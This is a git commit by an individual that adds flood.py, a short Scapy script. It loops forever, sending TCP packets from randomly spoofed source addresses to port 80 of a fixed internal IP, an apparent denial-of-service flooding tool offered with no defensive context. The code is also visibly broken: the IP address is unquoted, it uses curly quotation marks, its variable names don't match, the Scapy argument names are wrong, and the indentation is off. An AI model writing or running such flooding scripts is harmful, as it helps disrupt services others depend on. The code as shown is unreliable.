eff5eb9e8ab1f60c1ce89c88d8ead5293956ef0d
Jesse Huang <jesse.huang1205@gmail.com>
2020-11-28 15:53:04 -0500

    Add files via upload

---
+++ flood.py
@@ -0,0 +1,20 @@
+import random
+from scapy.all import *
+target_IP = 10.0.0.2
+source_port = 6553
+i = 1
+
+while True:
+   a = str(random.randint(1,254))
+   b = str(random.randint(1,254))
+   c = str(random.randint(1,254))
+   d = str(random.randint(1,254))
+   dot = “.”
+   
+   Source_ip = a + dot + b + dot + c + dot + d
+   IP1 = IP(source_IP = source_IP, destination = target_IP)
+   TCP1 = TCP(srcport = source_port, dstport = 80)
+   pkt = IP1 / TCP1
+   send(pkt,inter = .001)
+   print ("packet sent ", i)
+      i = i + 1
